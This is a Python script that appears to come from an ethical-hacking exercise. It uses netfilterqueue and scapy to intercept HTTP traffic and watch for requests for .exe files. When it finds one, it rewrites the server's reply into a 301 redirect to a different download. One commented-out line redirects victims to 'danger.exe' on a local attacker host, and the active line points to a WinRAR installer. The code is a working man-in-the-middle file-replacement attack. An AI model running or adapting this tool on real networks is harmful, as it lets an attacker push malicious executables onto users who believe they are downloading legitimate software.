import netfilterqueue as net
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def file_interceptor(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] exe Requested')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print('[+] Replacing File') 
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.9/files/danger.exe\n\n")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-591.exe\n\n")
                print(modified_packet.show())
                packet.set_payload(str(modified_packet))
                
    packet.accept()


queue = net.NetfilterQueue()
queue.bind(0, file_interceptor)
try:
    queue.run()
except:
    print('\nDetected Ctrl + C, Closing')